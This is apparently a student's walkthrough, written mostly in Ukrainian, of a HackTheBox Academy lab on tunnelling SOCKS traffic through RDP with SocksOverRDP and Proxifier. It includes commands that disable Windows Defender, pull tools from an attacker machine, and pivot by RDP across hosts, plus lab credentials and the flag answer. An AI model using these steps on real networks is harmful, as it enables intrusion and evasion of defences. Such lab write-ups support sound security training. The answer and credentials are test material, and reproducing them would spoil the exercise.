# RDP and SOCKS Tunneling with SocksOverRDP

## ℹ️ Informations

| Field | Value |
|-------|-------|
| 🌐 Platform | HackTheBox Academy |
| 📚 Module | Pivoting, Tunneling, and Port Forwarding |
| 🔗 Section | [1439](https://academy.hackthebox.com/module/158/section/1439) |

---

## 🔑 Key Concepts

**SocksOverRDP** — плагін що тунелює SOCKS трафік всередині RDP протоколу через **Dynamic Virtual Channels (DVC)**. Використовується коли є RDP доступ до pivot хоста, але немає прямого SSH або інших тунелів.

**Proxifier** — Windows застосунок що направляє будь-який TCP трафік через SOCKS proxy. Дозволяє використовувати mstsc.exe (стандартний RDP клієнт) через SOCKS тунель без нативної підтримки proxy.

### Схема атаки
```
Kali 
  → xfreerdp3 → 
    Win10/10.129.x.x (htb-student)
      → SocksOverRDP-Plugin.dll (реєструється в mstsc)
      → mstsc.exe →
        172.16.5.19 (victor) ← SocksOverRDP-Server.exe [*] Channel opened over RDP
      → 127.0.0.1:1080 (SOCKS5 listener на Win10)
      → Proxifier (перенаправляє весь трафік через SOCKS)
      → mstsc.exe →
        172.16.6.155 (jason) ← фінальний таргет
```

**Чому така схема:**
1. `SocksOverRDP-Plugin.dll` — реєструється як плагін mstsc і перехоплює RDP з'єднання
2. `SocksOverRDP-Server.exe` — запускається на pivot хості (172.16.5.19) всередині RDP сесії, відкриває DVC канал назад до Win10
3. Win10 отримує SOCKS5 listener на `127.0.0.1:1080`
4. `Proxifier` направляє весь трафік Win10 через цей SOCKS5
5. mstsc до фінального таргету йде через SOCKS тунель

---

## ⚠️ Важливі нюанси

- `SocksOverRDP-Server.exe` **обов'язково** запускати всередині RDP сесії до pivot хоста — інакше помилка `Could not open Dynamic Virtual Channel: 1168`
- Windows Defender видаляє обидва файли — вимикай перед завантаженням: `Set-MpPreference -DisableRealtimeMonitoring $true`
- На деяких системах (Server edition) Defender відсутній — помилка `Invalid class` є нормою
- Якщо RDP сесія до Win10 падає — весь ланцюжок розривається, треба відновлювати з початку
- Сервери HTB можуть глючити — якщо щось не працює без причини, просто перепідключись

---

## 🛠️ Key Commands

### Підготовка на Kali
```bash
# Завантаж SocksOverRDP
cd ~
wget https://github.com/nccgroup/SocksOverRDP/releases/download/v1.0/SocksOverRDP-x64.zip
unzip SocksOverRDP-x64.zip -d SocksOverRDP-x64

# Proxifier вже є у ~/Proxifier PE/
ls ~/Proxifier\ PE/
# Helper64.exe  Proxifier.exe  ProxyChecker.exe  PrxDrvPE64.dll  PrxDrvPE.dll

# ZIP всю папку для передачі
zip -r ProxifierPE.zip ~/Proxifier\ PE/

# HTTP сервер для передачі файлів
cd ~/SocksOverRDP-x64
python3 -m http.server 8080
```

### Підключення до Win10
```bash
xfreerdp3 /v:<win10_ip> /u:htb-student /p:'HTB_@cademy_stdnt!' \
  /cert:ignore /dynamic-resolution
```

### На Win10 — вимкни Defender і скачай файли
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true

cd C:\Users\htb-student\Desktop\
Invoke-WebRequest http://<kali_ip>:8080/SocksOverRDP-Plugin.dll -OutFile SocksOverRDP-Plugin.dll
Invoke-WebRequest http://<kali_ip>:8080/SocksOverRDP-Server.exe -OutFile SocksOverRDP-Server.exe
Invoke-WebRequest http://<kali_ip>:8080/ProxifierPE.zip -OutFile ProxifierPE.zip
Expand-Archive ProxifierPE.zip -DestinationPath .
```

### На Win10 — реєстрація плагіну
```powershell
regsvr32.exe SocksOverRDP-Plugin.dll
# → вікно "DllRegisterServer succeeded"
```

### На Win10 — підніми HTTP сервер для передачі на pivot
```powershell
cd C:\Users\htb-student\Desktop\
python3 -m http.server 8080
```

### На Win10 — підключись до pivot (172.16.5.19)
```
mstsc.exe → 172.16.5.19
User: victor / Pass: pass@123
```

### На 172.16.5.19 — скачай і запусти сервер
```powershell
Invoke-WebRequest http://172.16.5.129:8080/SocksOverRDP-Server.exe -OutFile C:\Users\victor\Desktop\SocksOverRDP-Server.exe

cd C:\Users\victor\Desktop\
.\SocksOverRDP-Server.exe
# [*] Channel opened over RDP  ← успіх!
```

### На Win10 — перевір SOCKS listener
```powershell
netstat -ano | findstr 1080
# TCP  127.0.0.1:1080  LISTENING
```

### На Win10 — налаштуй Proxifier
```
1. Запусти: C:\Users\htb-student\Desktop\Proxifier PE\Proxifier.exe
2. Profile → Proxy Servers → Add:
   Address: 127.0.0.1 | Port: 1080 | Protocol: SOCKS5 → OK
3. Profile → Proxification Rules → Default → Action: Proxy SOCKS5 → OK
```

### На Win10 — RDP до фінального таргету
```
mstsc.exe → 172.16.6.155
User: jason / Pass: WellConnected123!
```

---

## ❓ Questions

### Q1 — Contents of C:\Users\jason\Desktop\flag.txt
**Answer:** `H0pping@roundwithRDP!`

---

## 🔑 Credentials

| Host | User | Password |
|------|------|----------|
| 10.129.x.x (Win10) | htb-student | HTB_@cademy_stdnt! |
| 172.16.5.19 | victor | pass@123 |
| 172.16.6.155 | jason | WellConnected123! |
